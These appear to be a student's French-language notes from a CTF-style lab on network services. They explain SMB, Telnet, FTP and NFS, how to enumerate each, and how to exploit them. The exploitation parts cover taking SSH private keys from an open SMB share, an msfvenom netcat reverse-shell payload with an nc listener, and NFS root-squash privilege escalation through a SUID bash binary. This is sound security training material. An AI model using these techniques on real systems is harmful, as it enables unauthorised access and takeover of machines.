# Network services



### Understanding SMB

Serveur Message Block Protocol (SMB) est un 'client-server communication protocol' utilisé pour partager les acces aux fichier, imprimantes, serial ports etc sur un réseau. Il foont en sorte que les fichiers du systeme et les autres ressources (imprimantes, namees pipes, APIs) soient disponibles aux clients sur le serveur (shared file systems and printers).

Le protocole SMB est un response-request protocol, c'est à ddire qu'il transmet plusieurs messages entre le client et le serveur pour établir une connexion. Les clients se connectent aux serveurs via TCP/IP, NetBEUI ou IPS/SPX.

##### Fonctionnement

![SMB](/Users/theofalgayrettes/Downloads/SMB.png)

Une fois qu'une connexion a été établie, les clients peuvent envoyer des commandes (SMBs) au serveur qui leur accorde l'accès aux fichiers partagés, fichiers ouverts, read and write files, et tous les genres de choses que l'on veut faire sur les fichiers du systeme. Cependant, dans le cas des SMB, cela est bien via le réseau.

##### What runs SMB?

Windows OS, deepuis windows 95 ont inclus le support du protocole SMB. Samba, un serveur open source qui supporte le protocole SMB a été release pour les systèmes Unix.

### Enumerating SMB

##### Qu'est ce que l'énumeration ?

L'énumeration est un procédé de récolte d'informations concernant une cible dans le but de trouver des potentiels vecteurs d'attaque et aider dans l'exploitation. Ce procédé est esseentiel poour le succès d'une attaque car gâcher du temps sur des exploits qui ne fonctionnent pas ou qui peuvent faire crash le système peut être une perte d'énergie. L'énumeration peut être utilisée pour récolter des usernames, passwords, inforrmations concerrnant le réseau, hostnames, application data, services etc.

### SMB

Il y a des SMB shared drives auxquels ont peut se connecter et utiliser pour voir ou transferer des fichiers. SMB est un bon point de départ d'une attaque.

##### Port Scanning

La première étape d'une énumération est le scan des ports, pour trouver le maximum d'informations sur les services, applications, structure et OS de la cible (via Nmap).

##### Enum4Linux

C'est un ouutil utilisé poour énumérer les SMB shares sur les systèmes Windows et Linux.

La syntaxe est simple : `enum4linux [options] ip`

| TAG  | FUNCTION                                    |
| ---- | ------------------------------------------- |
| -U   | get userlist                                |
| -M   | get machine list                            |
| -N   | get namelist dump (different from -U and-M) |
| -S   | get sharelist                               |
| -P   | get password policy information             |
| -G   | get group and member list                   |
| -A   | all of the above (full basic enumeration)   |

##### Exploiting SMB

###### Méthode :

Suite à notre énumération, nous connaissons la SMB share location et le nom d'un SMB share interessant.

###### SMBClient

Vu qu'on essaye d'accéder à un share SMB, on a besoin d'un client pour accéder aux ressources sur le serveur. Nous allons utiliser SMBClient car cela fait partie de la suite Samba.
On peut accéder à distance au SMB share en utilisant la syntaxe : 

`smbclient //[IP]/[SHARE]`suivi des options :
-U [name] : to specify the user
-p [port] : to specify the port

smbclient commands : 

- more "fichier" : View a remote file with your pager.
- wget fichier : télécharge le fichier de la session à distance vers sa session.

Si on peut accéder au fichier .ssh, on cherche la clé id_rsa(clé ssh privée) et id_rsa.pub(clé ssh publique). Après avoir téléchargé ces deux clés (wget id_rsa*), copier le fichier id_rsa dans son fichier .ssh et changer les permissions (chmod 600 [fichier]). On cherche le nom d'utilisateur (qui est à la fin de la clé publique) et on a plus qu'à se connecter via ssh nom@ip.

##### Telnet

Telnet est un 'application protocol' qui permet, avec l'uutilisation d'un client telnet, de se connecter et d'exécuter des commandes sur une remote machine qui héberge un serveur telnet. Le client Telnet va établir une connexion avec le seerveur. Le client deviendra un terminal virtuel permettant d'interagir avec l'hôte à distance.

##### Remplacement 

Telnet envoit tous les message en texte clair et n'a pas de mécanisme de sécurité spécifique. Donc, dans beaucoup d'applications et de services, Telnet a été remplacé dans la plupart des implémentations par le protocole SSH.

##### Comment fonctionne Telnet ?

L'utilisateur se connecte au serveur en utilisaant le protocole Telnet en exécutant la commande `temnet`. L'utilisateur execute ensuite des commandes sur le serveur via des commandes spécifiques au prompte Telnet.
Pour se connecter à un serveur telnet : `telnet [ip] [port]`.

### Exploiting telnet

##### Reverse Shell

Un "Shell" est une piece de code ou programme qui peut être utilisé pour permettre l'exécution  de code ou de commandes sur un device. Un "Reverse Shell" est un type de shell dans lequel la machine cible communique avec la machine attaquante. Ceette derniere a un listenning port qui reçooit les connexion, qui résulte en l'éxecution du code/commandes.

msfvenom génére un 'reverse shell payload'. Cela va générer et encoder unn reverse shell netcat. Voici notre syntaxe :

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload
lhost = our local host IP address (this is **your** machine's IP address)
lport = the port to listen on (this is the port on **your** machine)
R = export the payload in raw format

Il faut ensuite lancer un listener netcat sur notre machine : `nc -lvp [listenning port]`. A noter que le listenning port est celui du payload donné par la commande précédente.

### Understanding FTP

File transfer protocol (FTP) est un protocole utilisé pour autoorité le transfert dee fichiers via un réseau. Celàà utilise un model client-serveur.

##### How does FTP work?

Une session FTP opère généraalmeent en utilisant 2 canaux :

- a command (sometimes called the control) channel
- a data channel

Le canal de commandes est utilisé pour transmettre les commandes et les réponses à ces commandes et le data channel est utilisé pour transférer les données.

Le client initie une connexion avec le serveur, le serveur validde les login credentials provided et ouvre la session. Lorsque la session est ouverte, le client peut exécuter des commandes FTP sur le serveur.

##### Active vs Passive

Le serveur FTP peut soit supporter des connexions actives, soit des connexions passives ou les deux :

- dans une connexion FTP active, le client ouvre un port et écoute. Le serveur doit est activement connecté avec lui.
- dans une connexion FTP passive, le serveur ouvre un port et écoute (passivement) et le client s'y connecte.

La séparation des deux cannaux est un moyen de permettre d'envoyer des commandes au serveur sans avoir à attendre pour le transfert de données de se terminer. Si les deux canaux étaient liés, on pourrait uniquement entrerr des commanddes entre les transferts de données, ce qui ne serait pas efficace pour les transferts de fichiers larges ou pour les connexions internet lentes.

##### Enumerating FTP

Commande nmap : `nmap -sV -oN nmap-10.10.206.110.out 10.10.206.110`

##### Reading

Here's some things that might be useful to read after completing this room, if it interests you:

- https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
- https://attack.mitre.org/techniques/T1210/
- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

##### Understanding NFS 

Network File System (NFS) permet à un système de partager des dossiers et des fichiers avec d'autres sur un réseau. En utilisant le NFS, les utilisateurs et programmes peuvent accéder aux dossiers sur un remote system presque comme si ils étaient des fichiers locaux. Cela est fait en assemblant tout ou une portion d'un fichier système sur un serveur. La portion du fichier systemet qui est assemblée est accessible aux clients selon les privilèges assignés sur chaque fichier.

##### How does NFS work?

https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

Premièrement, le client va demander à assembler un dossier d'un remote host sur un fichier local (exactement comme cela peut etre fair sur un physical device). Le service d'assemblage va ensuite le connecteur au 'relevant mount daemon' en utilisant le RPC.

Le serveur vérifie si l'utilisateur a la permission d'assembler le dossier qui a été demandé. Il va ensuite retourner un 'file handle' qui identifie uniquement les fichiers et dossiers présents sur le serveur.

Si quelqu'un veut l'accès à un fichier en utilisant un NFS, un appel RPC est placé dans le NFSD (le daemon NFS) sur le serveur. Cet appel prends des paramètres tels que :

- Le file handle
- Le nom du fichier auquel on demande l'accès
- Le user ID de l'utilisateur
- Le group ID de l'utilisateur

Ces paramètres sont utilisés pour determiner les accès aux fichiers demandés (ce qui contrôle les permissions des utilisateurs - ex: read/write filles).

##### What runs NFS?

En utilisant le protocole NFS, on peut transférer des fichiers entre des ordinateurs Windows et d'autres non-Windows (ex: Linux/mac/unix). Un ordinateur utilisant un serveur Windows peut être utilisé comme un NFS file server pour d'autres ordinateurs non-Windows. Aussi, NFS permet à un ordinateur non-windows mais utilisant un serveur windows pour accéder à un fichier stocké sur un serveur NFS non-windows.
https://www.datto.com/library/what-is-nfs-file-share
http://nfs.sourceforge.net/
https://wiki.archlinux.org/index.php/NFS

##### Enumerating NFS 

Enumeration tools :

- NFS-Common : Inclus lockd, statd, showmount, nfsstat, gssd, imapd et mount.nfs

- Port Scanning : nmap

- Mounting NFS-shares : `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
  Let's break this down

  |          |                                                              |
  | -------- | ------------------------------------------------------------ |
  | **Tag**  | **Function**                                                 |
  | sudo     | Run as root                                                  |
  | mount    | Execute the mount command                                    |
  | -t nfs   | Type of device to mount, then specifying that it's NFS       |
  | IP:share | The IP Address of the NFS server, and the name of the share we wish to mount |
  | -nolock  | Specifies not to use NLM locking                             |

#### Exploiting NFS

Si on a un shell avec de faibles privilèges et on voit que la machine a un share NFS, on peut utiliser cela pour escalader les privilèges, selon comment c'est configuré.

##### What is root_squash

Par défaut, sur les shares NFS,, root squashing est activé et empêche quiconque de ne connecter au share NFS d'avoir les accès root au volume NFS. Remote root users se voient assignés un utilisateur "nfsnobody" lors de la connection, ce qui a le moins de privileges locaux (ce qui n'est pas ce que l'on veut). Cependdant, si cela est désactivé, cela peut permettre la création de fichiers bit SUID, permetter un remote user un acces root au systeme.

##### SUID

Un fichier avec des bits SUID signifier que les fichiers peuvent est exécutés avec la permission du owner/group des fichiers (dans ce cas, le super-user).

##### Methode

​	NFS Access ->

​    Gain Low Privilege Shell ->

​      Upload Bash Executable to the NFS share ->

​        Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

​          Login through SSH ->

​            Execute SUID Bit Bash Executable ->

​              ROOT ACCESS

